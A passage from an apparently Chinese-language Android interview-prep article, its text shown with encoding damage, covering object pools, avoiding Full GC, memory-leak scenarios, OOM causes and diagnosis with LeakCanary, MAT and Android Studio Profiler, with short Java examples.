    <span class="hljs-keyword">private</span> Queue&lt;T&gt; pool = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> maxSize;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ObjectPool</span><span class="hljs-params">(<span class="hljs-type">int</span> maxSize)</span> {
        <span class="hljs-built_in">this</span>.maxSize = maxSize;
    }
    
    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">acquire</span><span class="hljs-params">()</span> {
        <span class="hljs-type">T</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> pool.poll();
        <span class="hljs-keyword">if</span> (obj == <span class="hljs-literal">null</span>) {
            obj = createObject();  <span class="hljs-comment">// æ± ä¸ºç©ºæ—¶åˆ›å»ºæ–°å¯¹è±¡</span>
        }
        <span class="hljs-keyword">return</span> obj;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">release</span><span class="hljs-params">(T obj)</span> {
        <span class="hljs-keyword">if</span> (pool.size() &lt; maxSize) {
            resetObject(obj);  <span class="hljs-comment">// é‡ç½®å¯¹è±¡çŠ¶æ€</span>
            pool.offer(obj);   <span class="hljs-comment">// å½’è¿˜åˆ°æ± ä¸­</span>
        }
    }
}
</code></pre>
<p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>é¢‘ç¹åˆ›å»ºçš„å¯¹è±¡ï¼ˆå¦‚åŠ¨ç”»å¯¹è±¡ã€ä¸´æ—¶å¯¹è±¡ï¼‰</li>
<li>åˆ›å»ºæˆæœ¬é«˜çš„å¯¹è±¡ï¼ˆå¦‚Bitmapã€å¤§å¯¹è±¡ï¼‰</li>
</ul>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>å‡å°‘å¯¹è±¡åˆ›å»ºï¼Œå‡å°‘GCé¢‘ç‡</li>
<li>æé«˜æ€§èƒ½ï¼Œå‡å°‘å†…å­˜åˆ†é…å¼€é”€</li>
</ul>
<p><strong>6. å¦‚ä½•é¿å…Full GCï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>Full GCæš‚åœæ—¶é—´é•¿ï¼Œåº”è¯¥å°½é‡é¿å…ã€‚</p>
<p><strong>1. é¿å…å†…å­˜æ³„æ¼</strong></p>
<ul>
<li>å†…å­˜æ³„æ¼ä¼šå¯¼è‡´å¯¹è±¡æ— æ³•å›æ”¶ï¼Œå†…å­˜é€æ¸è¢«å ç”¨</li>
<li>æœ€ç»ˆå¯¼è‡´è€å¹´ä»£æ»¡ï¼Œè§¦å‘Full GC</li>
<li>æ–¹æ³•ï¼šä½¿ç”¨LeakCanaryæ£€æµ‹ï¼Œä¿®å¤å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>2. å‡å°‘è€å¹´ä»£å¯¹è±¡</strong></p>
<ul>
<li>è€å¹´ä»£å¯¹è±¡å¤šï¼Œå®¹æ˜“è§¦å‘Full GC</li>
<li>æ–¹æ³•ï¼š
<ul>
<li>å‡å°‘é•¿æœŸå­˜æ´»çš„å¯¹è±¡</li>
<li>åŠæ—¶é‡Šæ”¾ä¸éœ€è¦çš„å¯¹è±¡</li>
<li>é¿å…å¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£</li>
</ul>
</li>
</ul>
<p><strong>3. ä¸è¦æ˜¾å¼è°ƒç”¨System.gc()</strong></p>
<ul>
<li>System.gc()ä¼šå¼ºåˆ¶è§¦å‘Full GC</li>
<li>Androidä¸æ¨èä½¿ç”¨</li>
<li>åº”è¯¥è®©ç³»ç»Ÿè‡ªåŠ¨ç®¡ç†GC</li>
</ul>
<p><strong>4. ä¼˜åŒ–å†…å­˜ä½¿ç”¨</strong></p>
<ul>
<li>å‡å°‘å¯¹è±¡åˆ›å»º</li>
<li>åŠæ—¶é‡Šæ”¾ä¸éœ€è¦çš„å¯¹è±¡</li>
<li>åˆç†ä½¿ç”¨ç¼“å­˜ï¼ˆLruCacheï¼‰</li>
</ul>
<p><strong>5. ç›‘æ§å’Œè°ƒä¼˜</strong></p>
<ul>
<li>ä½¿ç”¨Profilerç›‘æ§GC</li>
<li>æŸ¥çœ‹GCæ—¥å¿—ï¼Œåˆ†æFull GCçš„åŸå› </li>
<li>æ ¹æ®å®é™…æƒ…å†µä¼˜åŒ–</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šå¯èƒ½å¯¼è‡´Full GC</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Object&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <span class="hljs-comment">// æ— é™åˆ¶ç¼“å­˜ï¼Œå†…å­˜æ³„æ¼</span>

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šé¿å…Full GC</span>
<span class="hljs-keyword">private</span> LruCache&lt;String, Bitmap&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LruCache</span>&lt;&gt;(<span class="hljs-number">10</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);  <span class="hljs-comment">// æœ‰å¤§å°é™åˆ¶</span>
</code></pre>
<h4 data-id="heading-81">6.2.2 å†…å­˜æ³„æ¼</h4>
<p><strong>1. ä»€ä¹ˆæ˜¯å†…å­˜æ³„æ¼ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>å®šä¹‰ï¼š</strong>
å†…å­˜æ³„æ¼æ˜¯æŒ‡å¯¹è±¡å·²ç»ä¸å†ä½¿ç”¨ï¼Œä½†å› ä¸ºè¢«å¼•ç”¨æ— æ³•è¢«GCå›æ”¶ï¼Œå¯¼è‡´å†…å­˜é€æ¸è¢«å ç”¨ã€‚</p>
<p><strong>ä¸å†…å­˜æº¢å‡ºçš„åŒºåˆ«ï¼š</strong></p>
<ul>
<li><strong>å†…å­˜æ³„æ¼</strong>ï¼šå¯¹è±¡æ— æ³•å›æ”¶ï¼Œå†…å­˜é€æ¸è¢«å ç”¨ï¼Œæœ€ç»ˆå¯èƒ½å¯¼è‡´OOM</li>
<li><strong>å†…å­˜æº¢å‡º</strong>ï¼šå†…å­˜çœŸçš„ä¸å¤Ÿç”¨äº†ï¼Œæ— æ³•åˆ†é…æ–°å¯¹è±¡ï¼Œç«‹å³æŠ›å‡ºOutOfMemoryError</li>
</ul>
<p><strong>å±å®³ï¼š</strong></p>
<ul>
<li>å†…å­˜é€æ¸è¢«å ç”¨ï¼Œæœ€ç»ˆå¯èƒ½å¯¼è‡´OOM</li>
<li>åº”ç”¨å˜æ…¢ï¼Œå¯èƒ½è¢«ç³»ç»Ÿæ€æ­»</li>
<li>é¢‘ç¹è§¦å‘Full GCï¼Œå¯¼è‡´å¡é¡¿</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å†…å­˜æ³„æ¼ç¤ºä¾‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryLeak</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Object&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addToCache</span><span class="hljs-params">(Object obj)</span> {
        cache.add(obj);  <span class="hljs-comment">// å¯¹è±¡è¢«cacheå¼•ç”¨ï¼Œæ— æ³•å›æ”¶</span>
        <span class="hljs-comment">// å³ä½¿objä¸å†ä½¿ç”¨ï¼Œä¹Ÿæ— æ³•è¢«GCå›æ”¶</span>
        <span class="hljs-comment">// å†…å­˜é€æ¸è¢«å ç”¨ï¼Œæœ€ç»ˆå¯èƒ½å¯¼è‡´OOM</span>
    }
}
</code></pre>
<p><strong>2. Androidä¸­å¸¸è§çš„å†…å­˜æ³„æ¼åœºæ™¯æœ‰å“ªäº›ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>1. Activity/Contextæ³„æ¼</strong></p>
<ul>
<li><strong>é™æ€å˜é‡æŒæœ‰Activityå¼•ç”¨</strong>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Activity activity;  <span class="hljs-comment">// é™æ€å˜é‡æŒæœ‰Activityï¼Œå¯¼è‡´æ³„æ¼</span>
</code></pre>
</li>
<li><strong>å•ä¾‹æŒæœ‰Contextå¼•ç”¨</strong>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å•ä¾‹æŒæœ‰Activity Contextï¼Œå¯¼è‡´æ³„æ¼</span>
<span class="hljs-keyword">private</span> Context context;  <span class="hljs-comment">// å¦‚æœæ˜¯Activity Contextï¼Œä¼šæ³„æ¼</span>
</code></pre>
</li>
<li><strong>å†…éƒ¨ç±»æŒæœ‰å¤–éƒ¨ç±»å¼•ç”¨</strong>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// HandleræŒæœ‰Activityå¼•ç”¨</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">Handler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handler</span>() {
    <span class="hljs-comment">// HandleræŒæœ‰Activityå¼•ç”¨ï¼Œå¯¼è‡´æ³„æ¼</span>
};
</code></pre>
</li>
</ul>
<p><strong>2. å†…éƒ¨ç±»æŒæœ‰å¤–éƒ¨ç±»å¼•ç”¨</strong></p>
<ul>
<li><strong>Handlerå†…å­˜æ³„æ¼</strong>ï¼šHandleræŒæœ‰Activityå¼•ç”¨</li>
<li><strong>åŒ¿åç±»æ³„æ¼</strong>ï¼šåŒ¿åå†…éƒ¨ç±»æŒæœ‰å¤–éƒ¨ç±»å¼•ç”¨</li>
<li><strong>ç¤ºä¾‹</strong>ï¼šHandlerã€Runnableã€ç›‘å¬å™¨ç­‰</li>
</ul>
<p><strong>3. ç›‘å¬å™¨æœªå–æ¶ˆæ³¨å†Œ</strong></p>
<ul>
<li><strong>EventBusæœªå–æ¶ˆæ³¨å†Œ</strong>ï¼šæ³¨å†Œäº†ä½†å¿˜è®°å–æ¶ˆæ³¨å†Œ</li>
<li><strong>å¹¿æ’­æ¥æ”¶å™¨æœªå–æ¶ˆæ³¨å†Œ</strong>ï¼šæ³¨å†Œäº†ä½†å¿˜è®°å–æ¶ˆæ³¨å†Œ</li>
<li><strong>å…¶ä»–ç›‘å¬å™¨</strong>ï¼šæ³¨å†Œäº†ä½†å¿˜è®°å–æ¶ˆæ³¨å†Œ</li>
</ul>
<p><strong>4. é›†åˆç±»æ³„æ¼</strong></p>
<ul>
<li><strong>Listã€Mapä¸­ä¿å­˜äº†ä¸å†ä½¿ç”¨çš„å¯¹è±¡</strong></li>
<li>é›†åˆæŒæœ‰å¯¹è±¡å¼•ç”¨ï¼Œå¯¹è±¡æ— æ³•è¢«å›æ”¶</li>
<li>ç¤ºä¾‹ï¼šç¼“å­˜ã€é›†åˆç­‰</li>
</ul>
<p><strong>5. çº¿ç¨‹æ³„æ¼</strong></p>
<ul>
<li>çº¿ç¨‹æŒæœ‰å¯¹è±¡å¼•ç”¨ï¼Œçº¿ç¨‹ä¸ç»“æŸï¼Œå¯¹è±¡æ— æ³•å›æ”¶</li>
<li>ç¤ºä¾‹ï¼šAsyncTaskã€HandlerThreadç­‰</li>
</ul>
<p><strong>6. èµ„æºæœªå…³é—­</strong></p>
<ul>
<li>æ–‡ä»¶ã€æ•°æ®åº“è¿æ¥ã€ç½‘ç»œè¿æ¥ç­‰æœªå…³é—­</li>
<li>å¯¼è‡´èµ„æºæ³„æ¼</li>
</ul>
<p><strong>3. å¦‚ä½•æ£€æµ‹å†…å­˜æ³„æ¼ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>1. LeakCanaryè‡ªåŠ¨æ£€æµ‹ï¼ˆæ¨èï¼‰</strong></p>
<ul>
<li><strong>åŸç†</strong>ï¼šä½¿ç”¨WeakReferenceå’ŒReferenceQueueï¼Œç›‘æ§å¯¹è±¡æ˜¯å¦è¢«å›æ”¶</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šè‡ªåŠ¨æ£€æµ‹ï¼Œä¸éœ€è¦æ‰‹åŠ¨åˆ†æï¼Œèƒ½å¿«é€Ÿå‘ç°å†…å­˜æ³„æ¼</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼šæ·»åŠ ä¾èµ–ï¼Œè¿è¡Œåº”ç”¨ï¼Œè‡ªåŠ¨æ£€æµ‹</li>
</ul>
<p><strong>2. MATåˆ†æå †è½¬å‚¨</strong></p>
<ul>
<li><strong>åŸç†</strong>ï¼šåˆ†æå †è½¬å‚¨æ–‡ä»¶ï¼Œæ‰¾å‡ºæ— æ³•å›æ”¶çš„å¯¹è±¡å’Œå¼•ç”¨é“¾</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šèƒ½è¯¦ç»†åˆ†æå†…å­˜æ³„æ¼çš„åŸå› </li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼šç”Ÿæˆå †è½¬å‚¨ï¼Œå¯¼å‡ºhprofæ–‡ä»¶ï¼Œç”¨MATæ‰“å¼€åˆ†æ</li>
</ul>
<p><strong>3. Android Studio Profiler</strong></p>
<ul>
<li><strong>åŸç†</strong>ï¼šå®æ—¶ç›‘æ§å†…å­˜ä½¿ç”¨ï¼ŒæŸ¥çœ‹å¯¹è±¡åˆ†é…æƒ…å†µ</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šå®æ—¶ç›‘æ§ï¼Œæ–¹ä¾¿æŸ¥çœ‹å†…å­˜å˜åŒ–</li>
<li><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼šæ‰“å¼€Profilerçª—å£ï¼ŒæŸ¥çœ‹å†…å­˜ä½¿ç”¨æƒ…å†µ</li>
</ul>
<p><strong>æ£€æµ‹æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> ä½¿ç”¨LeakCanaryè‡ªåŠ¨æ£€æµ‹ï¼ˆå¼€å‘é˜¶æ®µï¼‰
<span class="hljs-bullet">2.</span> å¦‚æœå‘ç°æ³„æ¼ï¼Œä½¿ç”¨MATåˆ†æå †è½¬å‚¨
<span class="hljs-bullet">3.</span> æ‰¾å‡ºæ³„æ¼å¯¹è±¡å’Œå¼•ç”¨é“¾
<span class="hljs-bullet">4.</span> ä¿®å¤ä»£ç 
</code></pre>
<p><strong>4. å¦‚ä½•é¿å…å†…å­˜æ³„æ¼ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>1. æ­£ç¡®å¤„ç†ç”Ÿå‘½å‘¨æœŸ</strong></p>
<ul>
<li>åœ¨onDestroyä¸­æ¸…ç†èµ„æº</li>
<li>å–æ¶ˆæ³¨å†Œç›‘å¬å™¨</li>
<li>å…³é—­æ–‡ä»¶ã€æ•°æ®åº“è¿æ¥</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.onDestroy();
    <span class="hljs-comment">// æ¸…ç†èµ„æº</span>
    handler.removeCallbacksAndMessages(<span class="hljs-literal">null</span>);
    EventBus.getDefault().unregister(<span class="hljs-built_in">this</span>);
    cache.clear();
}
</code></pre>
<p><strong>2. åŠæ—¶å–æ¶ˆæ³¨å†Œç›‘å¬å™¨</strong></p>
<ul>
<li>æ³¨å†Œçš„ç›‘å¬å™¨è¦åœ¨onDestroyä¸­å–æ¶ˆæ³¨å†Œ</li>
<li>ç¤ºä¾‹ï¼šEventBusã€å¹¿æ’­æ¥æ”¶å™¨ç­‰</li>
</ul>
<p><strong>3. ä½¿ç”¨å¼±å¼•ç”¨ï¼ˆWeakReferenceï¼‰</strong></p>
<ul>
<li>å¯¹äºå¯èƒ½æ³„æ¼çš„å¼•ç”¨ï¼Œä½¿ç”¨WeakReference</li>
<li>ç¤ºä¾‹ï¼šHandlerã€é™æ€å˜é‡æŒæœ‰å¯¹è±¡æ—¶</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Handler</span> {
    <span class="hljs-keyword">private</span> WeakReference&lt;Activity&gt; activityRef;
    
    MyHandler(Activity activity) {
        activityRef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakReference</span>&lt;&gt;(activity);
    }
}
</code></pre>
<p><strong>4. é¿å…å¾ªç¯å¼•ç”¨</strong></p>
<ul>
<li>æ³¨æ„å¯¹è±¡ä¹‹é—´çš„ç›¸äº’å¼•ç”¨</li>
<li>åŠæ—¶æ–­å¼€ä¸éœ€è¦çš„å¼•ç”¨</li>
</ul>
<p><strong>5. åˆç†ä½¿ç”¨ç¼“å­˜</strong></p>
<ul>
<li>ä½¿ç”¨æœ‰å¤§å°é™åˆ¶çš„ç¼“å­˜ï¼ˆLruCacheï¼‰</li>
<li>åŠæ—¶æ¸…ç†ä¸éœ€è¦çš„ç¼“å­˜</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> LruCache&lt;String, Bitmap&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LruCache</span>&lt;&gt;(<span class="hljs-number">10</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);
</code></pre>
<h4 data-id="heading-82">6.2.3 å†…å­˜æº¢å‡ºï¼ˆOOMï¼‰</h4>
<p><strong>1. ä»€ä¹ˆæ˜¯å†…å­˜æº¢å‡ºï¼ˆOOMï¼‰ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>å®šä¹‰ï¼š</strong>
å†…å­˜æº¢å‡ºï¼ˆOutOfMemoryErrorï¼ŒOOMï¼‰æ˜¯æŒ‡åº”ç”¨éœ€è¦çš„å†…å­˜è¶…è¿‡äº†ç³»ç»Ÿåˆ†é…çš„é™åˆ¶ï¼Œæ— æ³•åˆ†é…æ–°å¯¹è±¡ã€‚</p>
<p><strong>Androidå †å†…å­˜æº¢å‡ºï¼š</strong></p>
<ul>
<li>æœ€å¸¸è§çš„æ˜¯å †å†…å­˜æº¢å‡ºï¼ˆOutOfMemoryError: Java heap spaceï¼‰</li>
<li>å †å†…å­˜ä¸è¶³ï¼Œæ— æ³•åˆ†é…æ–°å¯¹è±¡</li>
</ul>
<p><strong>å±å®³ï¼š</strong></p>
<ul>
<li>åº”ç”¨å´©æºƒï¼Œç”¨æˆ·ä½“éªŒå·®</li>
<li>å¯èƒ½å¯¼è‡´æ•°æ®ä¸¢å¤±</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OOMExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createTooManyObjects</span><span class="hljs-params">()</span> {
        List&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>());  <span class="hljs-comment">// æœ€ç»ˆå¯¼è‡´OOM</span>
        }
    }
}
</code></pre>
<p><strong>2. Androidå †å†…å­˜æº¢å‡ºå¦‚ä½•è§£å†³ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>1. æ’æŸ¥å†…å­˜æ³„æ¼</strong></p>
<ul>
<li>å†…å­˜æ³„æ¼æ˜¯å¯¼è‡´OOMçš„ä¸»è¦åŸå› </li>
<li>ä½¿ç”¨LeakCanaryæ£€æµ‹å†…å­˜æ³„æ¼</li>
<li>ä½¿ç”¨MATåˆ†æå †è½¬å‚¨ï¼Œæ‰¾å‡ºæ³„æ¼å¯¹è±¡</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼é—®é¢˜</li>
</ul>
<p><strong>2. å‡å°‘å¯¹è±¡åˆ›å»º</strong></p>
<ul>
<li>å‡å°‘ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
<li>ä½¿ç”¨å¯¹è±¡æ± å¤ç”¨å¯¹è±¡</li>
<li>é¿å…åœ¨å¾ªç¯ä¸­åˆ›å»ºå¤§é‡å¯¹è±¡</li>
</ul>
<p><strong>3. ä¼˜åŒ–å¤§å¯¹è±¡</strong></p>
<ul>
<li>åŠæ—¶é‡Šæ”¾å¤§å¯¹è±¡ï¼ˆå¤§å›¾ç‰‡ã€å¤§æ•°ç»„ï¼‰</li>
<li>å‹ç¼©å›¾ç‰‡å¤§å°</li>
<li>é¿å…åŠ è½½è¿‡å¤§çš„å›¾ç‰‡</li>
</ul>
<p><strong>4. åŠæ—¶é‡Šæ”¾èµ„æº</strong></p>
<ul>
<li>åœ¨onDestroyä¸­é‡Šæ”¾èµ„æº</li>
<li>å…³é—­æ–‡ä»¶ã€æ•°æ®åº“è¿æ¥</li>
<li>æ¸…ç†ç¼“å­˜</li>
</ul>
<p><strong>5. åˆ†æ‰¹åŠ è½½æ•°æ®</strong></p>
<ul>
<li>ä¸è¦ä¸€æ¬¡æ€§åŠ è½½å¤§é‡æ•°æ®</li>
<li>åˆ†æ‰¹åŠ è½½ï¼Œå‡å°‘å†…å­˜å‹åŠ›</li>
</ul>
<p><strong>6. å¢åŠ å†…å­˜é™åˆ¶ï¼ˆæ²»æ ‡ä¸æ²»æœ¬ï¼‰</strong></p>
<ul>
<li>åœ¨AndroidManifest.xmlä¸­è®¾ç½®largeHeap="true"</li>
<li>ä½†è¿™ä¸æ˜¯æ ¹æœ¬è§£å†³æ–¹æ¡ˆï¼Œè¿˜æ˜¯è¦ä¼˜åŒ–å†…å­˜ä½¿ç”¨</li>
</ul>
<p><strong>è§£å†³æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> ç”Ÿæˆå †è½¬å‚¨ï¼ˆOOMæ—¶è‡ªåŠ¨ç”Ÿæˆæˆ–æ‰‹åŠ¨ç”Ÿæˆï¼‰
<span class="hljs-bullet">2.</span> ä½¿ç”¨MATåˆ†æå †è½¬å‚¨
<span class="hljs-bullet">3.</span> æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡
<span class="hljs-bullet">4.</span> åˆ†æä¸ºä»€ä¹ˆè¿™äº›å¯¹è±¡æ— æ³•å›æ”¶ï¼ˆå†…å­˜æ³„æ¼ï¼Ÿï¼‰
<span class="hljs-bullet">5.</span> ä¿®å¤é—®é¢˜ï¼ˆä¿®å¤å†…å­˜æ³„æ¼ã€ä¼˜åŒ–å†…å­˜ä½¿ç”¨ï¼‰
</code></pre>
<p><strong>3. å¦‚ä½•æ’æŸ¥å†…å­˜æº¢å‡ºé—®é¢˜ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>æ’æŸ¥æ­¥éª¤ï¼š</strong></p>
<p><strong>1. ç”Ÿæˆå †è½¬å‚¨</strong></p>
<ul>
<li>åœ¨OOMæ—¶è‡ªåŠ¨ç”Ÿæˆå †è½¬å‚¨</li>
<li>æˆ–ä½¿ç”¨Android Studio Profileræ‰‹åŠ¨ç”Ÿæˆ</li>
<li>å¯¼å‡ºä¸ºhprofæ–‡ä»¶</li>
</ul>
<p><strong>2. ä½¿ç”¨MATåˆ†æå †è½¬å‚¨</strong></p>
<ul>
<li>ç”¨MATæ‰“å¼€hprofæ–‡ä»¶</li>
<li>æŸ¥çœ‹å ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
<li>åˆ†æå¯¹è±¡çš„å¼•ç”¨é“¾</li>
</ul>
<p><strong>3. æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</strong></p>
<ul>
<li>ä½¿ç”¨MATçš„"Histogram"åŠŸèƒ½</li>
<li>æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„ç±»</li>
<li>åˆ†æè¿™äº›å¯¹è±¡ä¸ºä»€ä¹ˆå ç”¨è¿™ä¹ˆå¤šå†…å­˜</li>
</ul>
<p><strong>4. åˆ†æå¼•ç”¨é“¾ï¼Œæ‰¾å‡ºæ— æ³•å›æ”¶çš„åŸå› </strong></p>
<ul>
<li>ä½¿ç”¨MATçš„"Path to GC Roots"åŠŸèƒ½</li>
<li>æ‰¾å‡ºå¯¹è±¡çš„å¼•ç”¨é“¾</li>
<li>åˆ†æä¸ºä»€ä¹ˆå¯¹è±¡æ— æ³•è¢«å›æ”¶ï¼ˆå†…å­˜æ³„æ¼ï¼Ÿï¼‰</li>
</ul>
<p><strong>5. ä¿®å¤é—®é¢˜</strong></p>
<ul>
<li>å¦‚æœæ˜¯å†…å­˜æ³„æ¼ï¼Œä¿®å¤æ³„æ¼</li>
<li>å¦‚æœæ˜¯å¤§å¯¹è±¡ï¼Œä¼˜åŒ–å¤§å¯¹è±¡</li>
<li>å¦‚æœæ˜¯å¯¹è±¡å¤ªå¤šï¼Œå‡å°‘å¯¹è±¡åˆ›å»º</li>
</ul>
<p><strong>å¸¸è§åŸå› ï¼š</strong></p>
<ul>
<li><strong>å†…å­˜æ³„æ¼</strong>ï¼šå¯¹è±¡æ— æ³•å›æ”¶ï¼Œå†…å­˜é€æ¸è¢«å ç”¨</li>
<li><strong>ä¸€æ¬¡æ€§åŠ è½½å¤ªå¤šæ•°æ®</strong>ï¼šä¸€æ¬¡æ€§åŠ è½½å¤§é‡æ•°æ®åˆ°å†…å­˜</li>
<li><strong>å¤§å¯¹è±¡å ç”¨è¿‡å¤šå†…å­˜</strong>ï¼šåŠ è½½è¿‡å¤§çš„å›¾ç‰‡ã€åˆ›å»ºè¿‡å¤§çš„æ•°ç»„</li>
</ul>
<p><strong>4. Androidå†…å­˜é™åˆ¶æ˜¯å¤šå°‘ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>ä¸åŒè®¾å¤‡æœ‰ä¸åŒçš„å †å†…å­˜ä¸Šé™ï¼š</strong></p>
<p><strong>ä½ç«¯è®¾å¤‡ï¼š</strong></p>
<ul>
<li>å¯èƒ½åªæœ‰å‡ åMBï¼ˆå¦‚32MBã€48MBã€64MBï¼‰</li>
<li>å†…å­˜éå¸¸æœ‰é™ï¼Œå¿…é¡»åˆç†ä½¿ç”¨</li>
</ul>
<p><strong>ä¸­ç«¯è®¾å¤‡ï¼š</strong></p>
<ul>
<li>é€šå¸¸æœ‰128MBã€192MBã€256MBç­‰</li>
<li>å†…å­˜ç›¸å¯¹å……è¶³ï¼Œä½†ä»éœ€åˆç†ä½¿ç”¨</li>
</ul>
<p><strong>é«˜ç«¯è®¾å¤‡ï¼š</strong></p>
<ul>
<li>å¯èƒ½æœ‰512MBã€1GBã€2GBç”šè‡³æ›´å¤š</li>
<li>å†…å­˜ç›¸å¯¹å……è¶³ï¼Œä½†ä»éœ€ä¼˜åŒ–</li>
</ul>
<p><strong>å¦‚ä½•æŸ¥çœ‹åº”ç”¨çš„å†…å­˜é™åˆ¶ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ActivityManager</span> <span class="hljs-variable">activityManager</span> <span class="hljs-operator">=</span> (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
ActivityManager.<span class="hljs-type">MemoryInfo</span> <span class="hljs-variable">memoryInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActivityManager</span>.MemoryInfo();
activityManager.getMemoryInfo(memoryInfo);
<span class="hljs-type">long</span> <span class="hljs-variable">maxMemory</span> <span class="hljs-operator">=</span> memoryInfo.totalMem;  <span class="hljs-comment">// æ€»å†…å­˜</span>
<span class="hljs-type">long</span> <span class="hljs-variable">availableMemory</span> <span class="hljs-operator">=</span> memoryInfo.availMem;  <span class="hljs-comment">// å¯ç”¨å†…å­˜</span>
</code></pre>
<p><strong>å†…å­˜é™åˆ¶çš„å½±å“ï¼š</strong></p>
<ul>
<li>å†…å­˜æœ‰é™ï¼Œå¿…é¡»åˆç†ä½¿ç”¨</li>
<li>GCæ›´é¢‘ç¹ï¼ˆå†…å­˜ä¸è¶³æ—¶ï¼‰</li>
<li>éœ€è¦ä¼˜åŒ–å†…å­˜ä½¿ç”¨ï¼Œé¿å…OOM</li>
</ul>
<h4 data-id="heading-83">6.2.4 GCæ£€æµ‹ä¸è¯Šæ–­</h4>
<p><strong>1. å¸¸ç”¨çš„Androidå†…å­˜ç›‘æ§å·¥å…·æœ‰å“ªäº›ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>1. Android Studio Profilerï¼ˆæœ€å¸¸ç”¨ï¼‰</strong></p>
<ul>
